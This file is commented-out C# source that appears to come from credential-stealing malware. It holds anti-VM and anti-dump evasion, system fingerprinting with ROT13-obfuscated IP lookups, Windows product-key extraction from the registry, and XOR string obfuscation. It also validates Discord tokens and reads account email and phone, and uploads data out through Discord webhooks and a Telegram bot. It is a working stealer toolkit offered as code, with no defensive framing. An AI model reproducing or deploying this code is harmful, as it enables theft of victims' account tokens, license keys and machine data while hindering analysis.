//                    if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
//                    {
//                        Debug.WriteLine("VM Detected");
//                        if (Exit)
//                            Environment.FailFast("Some retard who thinks he can reverse this application.");
//                    }

//            foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
//                if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
//                {
//                    Debug.WriteLine("VM Detected");
//                    if (Exit)
//                        Environment.FailFast("Some retard who thinks he can reverse this application.");
//                }
//        }

//        static public string DiskId()
//        {
//            if (!String.IsNullOrEmpty(_Id))
//                return _Id;

//            try
//            {
//                ManagementObject _Disk = new ManagementObject(@"win32_logicaldisk.deviceid=""c:""");
//                _Disk.Get();

//                _Id = $"{_Disk["VolumeSerialNumber"]}";
//            }
//            catch { _Id = "9SB42HS"; }

//            return DiskId();
//        }

//        static public int UniqueSeed()
//        {
//            if (_UniqueSeed != 0)
//                return _UniqueSeed;

//            DiskId();

//            int seed = 0;
//            foreach (char i in _Id)
//                seed += (int)Char.GetNumericValue(i);

//            _UniqueSeed = seed;
//            return seed;
//        }

//        static public void AntiDump()
//        {
//            var process = Process.GetCurrentProcess();
//            var base_address = process.MainModule.BaseAddress;
//            var dwpeheader = Marshal.ReadInt32((IntPtr)(base_address + 0x3C));
//            var wnumberofsections = Marshal.ReadInt16((IntPtr)(base_address + dwpeheader + 0x6));

//            EraseSection(base_address, 30);

//            for (int i = 0; i < PE.dWords.Length; i++)
//                EraseSection((IntPtr)(base_address + dwpeheader + PE.dWords[i]), 4);

//            for (int i = 0; i < PE.Words.Length; i++)
//                EraseSection((IntPtr)(base_address + dwpeheader + PE.Words[i]), 2);

//            for (int i = 0; i < PE.Bytes.Length; i++)
//                EraseSection((IntPtr)(base_address + dwpeheader + PE.Bytes[i]), 1);

//            int x = 0;
//            int y = 0;

//            while (x <= wnumberofsections)
//            {
//                if (y == 0)
//                    EraseSection((IntPtr)((base_address + dwpeheader + 0xFA + (0x28 * x)) + 0x20), 2);

//                EraseSection((IntPtr)((base_address + dwpeheader + 0xFA + (0x28 * x)) + PE.SectionTabledWords[y]), 4);

//                y++;

//                if (y == PE.SectionTabledWords.Length)
//                {
//                    x++;
//                    y = 0;
//                }
//            }
//        }
//    }

//    public class Machine
//    {
//        static private string[] SizeSuffixes { get; } = { "bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB" };
//        public string WindowsLicense { get; private set; }
//        public string PublicIPv4 { get; private set; }
//        public string LanIPv4 { get; private set; }
//        public string OsName { get; private set; }
//        public string OsArchitecture { get; private set; }
//        public string OsVersion { get; private set; }
//        public string ProcessName { get; private set; }
//        public string GpuVideo { get; private set; }
//        public string GpuVersion { get; private set; }
//        public string DiskDetails { get; private set; }
//        public string PcMemory { get; private set; }

//        public Machine()
//        {
//            ManagementObjectSearcher ObjSearcher = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
//            foreach (ManagementObject _obj in ObjSearcher.Get())
//            {
//                if (_obj["Caption"] != null)
//                    OsName = _obj["Caption"].ToString();

//                if (_obj["OSArchitecture"] != null)
//                    OsArchitecture = _obj["OSArchitecture"].ToString();

//                if (_obj["Version"] != null)
//                    OsVersion = _obj["Version"].ToString();
//            }

//            RegistryKey CentralProcessor = Registry.LocalMachine.OpenSubKey(@"Hardware\Description\System\CentralProcessor\0", RegistryKeyPermissionCheck.ReadSubTree);

//            if (CentralProcessor != null)
//            {
//                var value = CentralProcessor.GetValue("ProcessorNameString");
//                if (value != null)
//                    ProcessName = value.ToString();
//            }

//            ObjSearcher = new ManagementObjectSearcher("select * from Win32_VideoController");
//            foreach (ManagementObject _obj in ObjSearcher.Get())
//            {
//                GpuVideo = _obj["VideoProcessor"].ToString();
//                GpuVersion = _obj["DriverVersion"].ToString();
//            }

//            DriveInfo[] Drives = DriveInfo.GetDrives();
//            foreach (DriveInfo _drive in Drives)
//                if (_drive.IsReady)
//                    DiskDetails += $"Drive {_drive.Name}\\ - {SizeSuffix(_drive.AvailableFreeSpace)}/{SizeSuffix(_drive.TotalSize)}{Environment.NewLine}";

//            ObjSearcher = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory");

//            Int64 Capacity = 0;
//            foreach (ManagementObject WniPART in ObjSearcher.Get())
//                Capacity += Convert.ToInt64(WniPART.Properties["Capacity"].Value);

//            PcMemory = SizeSuffix(Capacity);

//            IPHostEntry ipHostEntry = Dns.GetHostEntry(string.Empty);
//            foreach (IPAddress address in ipHostEntry.AddressList)
//            {
//                if (address.AddressFamily == AddressFamily.InterNetwork)
//                {
//                    LanIPv4 = address.ToString();
//                    break;
//                }
//            }

//            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;

//            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Encryption.ROT13("uggc://vspbasvt.zr"));
//            request.Proxy = null;
//            request.UserAgent = "curl";
//            try
//            {
//                PublicIPv4 = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("\n", "").Replace("\r", "");
//            }
//            catch
//            { }

//            if (string.IsNullOrEmpty(PublicIPv4))
//            {
//                request = (HttpWebRequest)WebRequest.Create(Encryption.ROT13("uggcf://ncv.vcvsl.bet?sbezng=wfba"));
//                request.Proxy = null;
//                request.UserAgent = "curl";
//                try
//                {
//                    PublicIPv4 = JObject.Parse(new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("\n", "").Replace("\r", ""))["ip"].ToString();
//                }
//                catch { }
//            }

//            WindowsLicense = GetProductKey();
//        }

//        public static string GetProductKey()
//        {
//            var localKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);

//            if (Environment.Is64BitOperatingSystem)
//                localKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);

//            var registryKeyValue = localKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue("DigitalProductId");
//            if (registryKeyValue == null)
//                return "Failed to get DigitalProductId from registry";
//            var digitalProductId = (byte[])registryKeyValue;

//            return DecodeProductKey(digitalProductId);
//        }

//        private static string DecodeProductKey(byte[] digitalProductId)
//        {
//            var key = String.Empty;
//            const int keyOffset = 52;
//            var isWin8 = (byte)((digitalProductId[66] / 6) & 1);
//            digitalProductId[66] = (byte)((digitalProductId[66] & 0xf7) | (isWin8 & 2) * 4);

//            const string digits = "BCDFGHJKMPQRTVWXY2346789";
//            var last = 0;
//            for (var i = 24; i >= 0; i--)
//            {
//                var current = 0;
//                for (var j = 14; j >= 0; j--)
//                {
//                    current = current * 256;
//                    current = digitalProductId[j + keyOffset] + current;
//                    digitalProductId[j + keyOffset] = (byte)(current / 24);
//                    current = current % 24;
//                    last = current;
//                }
//                key = digits[current] + key;
//            }

//            var keypart1 = key.Substring(1, last);
//            var keypart2 = key.Substring(last + 1, key.Length - (last + 1));
//            key = keypart1 + "N" + keypart2;

//            for (var i = 5; i < key.Length; i += 6)
//            {
//                key = key.Insert(i, "-");
//            }

//            return key;
//        }

//        private static string SizeSuffix(Int64 value)
//        {
//            if (value < 0)
//                return "-" + SizeSuffix(-value);

//            if (value == 0)
//                return "0.0 bytes";

//            int mag = (int)Math.Log(value, 1024);
//            return $"{(decimal)value / (1L << (mag * 10))} {SizeSuffixes[mag]}";
//        }
//    }

//    public class Encryption
//    {
//        public static string ComputeSha256Hash(string rawData)
//        {
//            using (SHA256 sha256Hash = SHA256.Create())
//            {
//                byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));
//                StringBuilder builder = new StringBuilder();
//                for (int i = 0; i < bytes.Length; i++)
//                    builder.Append(bytes[i].ToString("x2"));

//                return builder.ToString();
//            }
//        }

//        public static string SHA256CheckSum(string filePath)
//        {
//            using (SHA256 SHA256 = SHA256Managed.Create())
//            {
//                try
//                {
//                    using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
//                        return Convert.ToBase64String(SHA256.ComputeHash(fileStream));
//                }
//                catch { return null; }
//            }
//        }

//        private static byte[] StringToByteArray(string hex)
//        {
//            //Haha belongs to the Shabak
//            return (from x in Enumerable.Range(0, hex.Length)
//                    where x % 2 == 0
//                    select Convert.ToByte(hex.Substring(x, 2), 16)).ToArray<byte>();
//        }

//        public static string StrXOR(string input, byte key, bool encrypt)
//        {
//            Thread.Sleep(20);

//            string output = string.Empty;
//            if (encrypt)
//            {
//                foreach (char c in input)
//                    output += (c ^ key).ToString("X2");
//            }
//            else
//            {
//                try
//                {
//                    byte[] strBytes = StringToByteArray(input);
//                    foreach (byte b in strBytes)
//                        output += (char)(b ^ key);
//                }
//                catch
//                {
//                    return string.Empty;
//                }
//            }

//            return output;
//        }

//        public static string GenerateKey()
//        {
//            return "IndexOutOfRangeException%__@LIORLUBMAN@__%IndexOutOfRangeException";
//        }

//        public static string GenerateKey(int size, bool lowerCase, int seed = 0)
//        {
//            Random r = new Random();
//            if (seed != 0)
//                r = new Random(seed);

//            string output = "";

//            for (int i = 0; i < size; ++i)
//            {
//                int[] rs = { r.Next('0', '9' + 1), r.Next('a', 'z' + 1), r.Next('A', 'Z' + 1) };
//                output += (char)rs[r.Next(3)];
//            }

//            return lowerCase ? output.ToLower() : output.ToUpper();
//        }

//        public static string Base64Encode(string plainText)
//        {
//            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
//        }

//        public static string Base64Decode(string base64EncodedData)
//        {
//            return Encoding.UTF8.GetString(Convert.FromBase64String(base64EncodedData));
//        }

//        public static string StrXOR(string input, bool encrypt, int Length = 1000)
//        {
//            Thread.Sleep(20);

//            string key = string.Empty;
//            string output = string.Empty;
//            if (encrypt)
//            {
//                key = GenerateKey(Length, false);
//                output = key;
//                for (int i = 0; i < input.Length; ++i)
//                    output += (input[i] ^ key[i % key.Length]).ToString("X2");
//            }
//            else
//            {
//                try
//                {
//                    key = input.Remove(Length);
//                    byte[] strBytes = StringToByteArray(input.Substring(Length));
//                    for (int i = 0; i < strBytes.Length; ++i)
//                        output += (char)(strBytes[i] ^ key[i % key.Length]);
//                }
//                catch
//                {
//                    return string.Empty;
//                }
//            }

//            return output;
//        }

//        public static string StrXOR(string input, string key, bool encrypt)
//        {
//            Thread.Sleep(20);

//            if (key.Length == 0)
//                return string.Empty;

//            string output = string.Empty;
//            if (encrypt)
//            {
//                for (int i = 0; i < input.Length; ++i)
//                    output += (input[i] ^ key[i % key.Length]).ToString("X2");
//            }
//            else
//            {
//                try
//                {
//                    byte[] strBytes = StringToByteArray(input);
//                    for (int i = 0; i < strBytes.Length; ++i)
//                        output += (char)(strBytes[i] ^ key[i % key.Length]);
//                }
//                catch
//                {
//                    return string.Empty;
//                }
//            }

//            return output;
//        }

//        public static string ROT13(string value)
//        {
//            char[] array = value.ToCharArray();
//            for (int i = 0; i < array.Length; i++)
//            {
//                int number = (int)array[i];

//                if (number >= 'a' && number <= 'z')
//                {
//                    if (number > 'm')
//                        number -= 13;
//                    else
//                        number += 13;
//                }
//                else if (number >= 'A' && number <= 'Z')
//                {
//                    if (number > 'M')
//                        number -= 13;
//                    else
//                        number += 13;
//                }

//                array[i] = (char)number;
//            }
//            return new string(array);
//        }
//    }

//    static public class Notepad
//    {
//        [DllImport("user32.dll", EntryPoint = "SetWindowText")]
//        static private extern int SetWindowText(IntPtr hWnd, string text);

//        [DllImport("user32.dll", EntryPoint = "FindWindowEx")]
//        static private extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

//        [DllImport("User32.dll", EntryPoint = "SendMessage")]
//        static private extern int SendMessage(IntPtr hWnd, int uMsg, int wParam, string lParam);

//        static public void Show(string message, string title = null)
//        {
//            Process notepad = Process.Start(new ProcessStartInfo("notepad.exe"));
//            if (notepad != null)
//            {
//                notepad.WaitForInputIdle();

//                if (!string.IsNullOrEmpty(title))
//                    SetWindowText(notepad.MainWindowHandle, title);

//                if (!string.IsNullOrEmpty(message))
//                {
//                    IntPtr child = FindWindowEx(notepad.MainWindowHandle, new IntPtr(0), "Edit", null);
//                    SendMessage(child, 0x000C, 0, message);
//                }
//            }
//        }
//    }

//    public class DiscordClient
//    {
//        private string Endpoint { get; } = "https://discord.com/api/v9/users/@me";
//        public ulong Id { get; private set; }
//        public string Username { get; private set; }
//        public string Discriminator { get; private set; }
//        public bool IsValidToken { get; private set; } = true;
//        public string Avatar { get; private set; }
//        public bool Verified { get; private set; }
//        public string Email { get; private set; }
//        public string Banner { get; private set; }
//        public int? AccentColor { get; private set; }
//        public PremiumType Premium { get; private set; }
//        public string Phone { get; private set; }
//        public DateTimeOffset CreatedAt { get; private set; }
//        public string Token { get; private set; }

//        public enum PremiumType
//        {
//            None = 0,
//            Nitro_Classic = 1,
//            Nitro = 2
//        }

//        public DiscordClient(string token)
//        {
//            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Endpoint);
//            request.Headers.Set("Authorization", token);

//            string response = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("\n", "").Replace("\r", "");
//            JObject jData = null;

//            try
//            {
//                jData = JObject.Parse(response);

//                this.Id = ulong.Parse($"{jData["id"]}");
//                this.Username = $"{jData["username"]}";
//                this.Discriminator = $"{jData["discriminator"]}";
//                this.Avatar = $"{jData["avatar"]}";
//                this.Verified = $"{jData["verified"]}".ToLower().StartsWith("tru");
//                this.Email = $"{jData["email"]}";
//                this.Banner = $"{jData["banner"]}";
//                this.Phone = $"{jData["phone"]}";
//                this.CreatedAt = DateTimeOffset.FromUnixTimeMilliseconds((long)((this.Id >> 22) + 1420070400000UL));
//                this.AccentColor = int.Parse(!String.IsNullOrEmpty($"{jData["accent_color"]}") ? $"{jData["accent_color"]}" : "0");
//                this.Token = token;

//                if (!String.IsNullOrEmpty($"{jData["premium_type"]}"))
//                    this.Premium = (PremiumType)Enum.Parse(typeof(PremiumType), $"{jData["premium_type"]}");
//            }
//            catch (Exception ex) { IsValidToken = ex.Message.Contains("401"); }
//        }
//    }

//    public class DiscordWebhook
//    {
//        public struct DiscordMessage
//        {
//            /// <summary>
//            /// Message content
//            /// </summary>
//            public string Content;

//            /// <summary>
//            /// Read message to everyone on the channel
//            /// </summary>
//            public bool TTS;

//            /// <summary>
//            /// Webhook profile username to be shown
//            /// </summary>
//            public string Username;

//            /// <summary>
//            /// Webhook profile avater to be shown
//            /// </summary>
//            public string AvatarUrl;

//            /// <summary>
//            /// List of embeds
//            /// </summary>
//            public List<DiscordEmbed> Embeds;

//            public override string ToString() => Utils.StructToJson(this).ToString(Formatting.None);
//        }

//        /// <summary>
//        /// Discord embed data object
//        /// </summary>
//        public struct DiscordEmbed
//        {
//            /// <summary>
//            /// Embed title
//            /// </summary>
//            public string Title;

//            /// <summary>
//            /// Embed description
//            /// </summary>
//            public string Description;

//            /// <summary>
//            /// Embed url
//            /// </summary>
//            public string Url;

//            /// <summary>
//            /// Embed timestamp
//            /// </summary>
//            public DateTime? Timestamp;

//            /// <summary>
//            /// Embed color
//            /// </summary>
//            public Color? Color;

//            /// <summary>
//            /// Embed footer
//            /// </summary>
//            public EmbedFooter? Footer;

//            /// <summary>
//            /// Embed image
//            /// </summary>
//            public EmbedMedia? Image;

//            /// <summary>
//            /// Embed thumbnail
//            /// </summary>
//            public EmbedMedia? Thumbnail;

//            /// <summary>
//            /// Embed video
//            /// </summary>
//            public EmbedMedia? Video;

//            /// <summary>
//            /// Embed provider
//            /// </summary>
//            public EmbedProvider? Provider;

//            /// <summary>
//            /// Embed author
//            /// </summary>
//            public EmbedAuthor? Author;

//            /// <summary>
//            /// Embed fields list
//            /// </summary>
//            public List<EmbedField> Fields;

//            public override string ToString() => Utils.StructToJson(this).ToString(Formatting.None);
//        }

//        /// <summary>
//        /// Discord embed footer data object
//        /// </summary>
//        public struct EmbedFooter
//        {
//            /// <summary>
//            /// Footer text
//            /// </summary>
//            public string Text;

//            /// <summary>
//            /// Footer icon
//            /// </summary>
//            public string IconUrl;

//            /// <summary>
//            /// Footer icon proxy
//            /// </summary>
//            public string ProxyIconUrl;

//            public override string ToString() => Utils.StructToJson(this).ToString(Formatting.None);
//        }

//        /// <summary>
//        /// Discord embed media data object (images/thumbs/videos)
//        /// </summary>
//        public struct EmbedMedia
//        {
//            /// <summary>
//            /// Media url
//            /// </summary>
//            public string Url;

//            /// <summary>
//            /// Media proxy url
//            /// </summary>
//            public string ProxyUrl;

//            /// <summary>
//            /// Media height
//            /// </summary>
//            public int? Height;

//            /// <summary>
//            /// Media width
//            /// </summary>
//            public int? Width;

//            public override string ToString() => Utils.StructToJson(this).ToString(Formatting.None);
//        }

//        /// <summary>
//        /// Discord embed provider data object
//        /// </summary>
//        public struct EmbedProvider
//        {
//            /// <summary>
//            /// Provider name
//            /// </summary>
//            public string Name;

//            /// <summary>
//            /// Provider url
//            /// </summary>
//            public string Url;

//            public override string ToString() => Utils.StructToJson(this).ToString(Formatting.None);
//        }

//        /// <summary>
//        /// Discord embed author data object
//        /// </summary>
//        public struct EmbedAuthor
//        {
//            /// <summary>
//            /// Author name
//            /// </summary>
//            public string Name;

//            /// <summary>
//            /// Author url
//            /// </summary>
//            public string Url;

//            /// <summary>
//            /// Author icon
//            /// </summary>
//            public string IconUrl;

//            /// <summary>
//            /// Author icon proxy
//            /// </summary>
//            public string ProxyIconUrl;

//            public override string ToString() => Utils.StructToJson(this).ToString(Formatting.None);
//        }

//        /// <summary>
//        /// Discord embed field data object
//        /// </summary>
//        public struct EmbedField
//        {
//            /// <summary>
//            /// Field name
//            /// </summary>
//            public string Name;

//            /// <summary>
//            /// Field value
//            /// </summary>
//            public string Value;

//            /// <summary>
//            /// Field align
//            /// </summary>
//            public bool InLine;

//            public override string ToString() => Utils.StructToJson(this).ToString(Formatting.None);
//        }

//        /// <summary>
//        /// Webhook url
//        /// </summary>
//        public string Url { get; private set; }
//        public bool Enabled;

//        public DiscordWebhook(string url)
//        {
//            if (Uri.TryCreate(url, UriKind.Absolute, out Uri uri))
//            {
//                this.Url = url;
//                this.Enabled = true;
//            }
//        }

//        private void AddField(MemoryStream stream, string bound, string cDisposition, string cType, byte[] data)
//        {
//            string prefix = stream.Length > 0 ? "\r\n--" : "--";
//            string fBegin = $"{prefix}{bound}\r\n";

//            byte[] fBeginBuffer = Utils.Encode(fBegin);
//            byte[] cDispositionBuffer = Utils.Encode(cDisposition);
//            byte[] cTypeBuffer = Utils.Encode(cType);

//            stream.Write(fBeginBuffer, 0, fBeginBuffer.Length);
//            stream.Write(cDispositionBuffer, 0, cDispositionBuffer.Length);
//            stream.Write(cTypeBuffer, 0, cTypeBuffer.Length);
//            stream.Write(data, 0, data.Length);
//        }

//        private void SetJsonPayload(MemoryStream stream, string bound, string json)
//        {
//            string cDisposition = "Content-Disposition: form-data; name=\"payload_json\"\r\n";
//            string cType = "Content-Type: application/octet-stream\r\n\r\n";
//            AddField(stream, bound, cDisposition, cType, Utils.Encode(json));
//        }

//        private void SetFile(MemoryStream stream, string bound, int index, FileInfo file)
//        {
//            string cDisposition = $"Content-Disposition: form-data; name=\"file_{index}\"; filename=\"{file.Name}\"\r\n";
//            string cType = "Content-Type: application/octet-stream\r\n\r\n";
//            AddField(stream, bound, cDisposition, cType, File.ReadAllBytes(file.FullName));
//        }

//        /// <summary>
//        /// Send webhook message
//        /// </summary>
//        public void Send(DiscordMessage message, params FileInfo[] files)
//        {
//            if (!this.Enabled)
//                return;

//            if (string.IsNullOrEmpty(Url))
//                throw new ArgumentNullException("Invalid Webhook URL.");

//            string bound = "------------------------" + DateTime.Now.Ticks.ToString("x");
//            WebClient webhookRequest = new WebClient();
//            webhookRequest.Headers.Add("Content-Type", "multipart/form-data; boundary=" + bound);

//            MemoryStream stream = new MemoryStream();
//            for (int i = 0; i < files.Length; i++)
//                SetFile(stream, bound, i, files[i]);

//            string json = message.ToString();
//            SetJsonPayload(stream, bound, json);

//            byte[] bodyEnd = Utils.Encode($"\r\n--{bound}--");
//            stream.Write(bodyEnd, 0, bodyEnd.Length);

//            try
//            {
//                webhookRequest.UploadData(this.Url, stream.ToArray());
//            }
//            catch (WebException ex)
//            {
//                throw new WebException(Utils.Decode(ex.Response.GetResponseStream()));
//            }

//            stream.Dispose();
//        }
//    }

//    public class TelegramAPI
//    {
//        public bool Enabled;
//        public ulong ChatId;
//        public string Token;
//        private string Endpoint = "https://api.telegram.org/bot";

//        public TelegramAPI(string Token, ulong ChatId)
//        {
//            if (Token.Length == 46 && Token.Contains(":") && ChatId.ToString().Length == 9)
//            {
//                this.ChatId = ChatId;
//                this.Token = Token;
//                this.Endpoint += $"{Token}/sendDocument?chat_id={ChatId}";
//                Enabled = true;
//            }
//        }

//        public void Send(byte[] fileData, string fileName, string content)
//        {
//            if (!this.Enabled)
//                return;

//            try
//            {
//                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
//                WebClient webClient = new WebClient
//                {
//                    Proxy = null
//                };

//                string boundary = "------------------------" + DateTime.Now.Ticks.ToString("x");
//                webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + boundary);
//                string @string = webClient.Encoding.GetString(fileData);
//                string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", new object[]
//                {
//                    boundary,
//                    fileName,
//                    "application/x-ms-dos-executable",
//                    @string
//                });

//                byte[] bytes = webClient.Encoding.GetBytes(s);
//                webClient.UploadData(!string.IsNullOrEmpty(content) ? this.Endpoint + $"&parse_mode=markdown&caption={content}" : this.Endpoint, "POST", bytes);
//            }
//            catch (Exception)
//            {

//            }
//        }
//    }
//}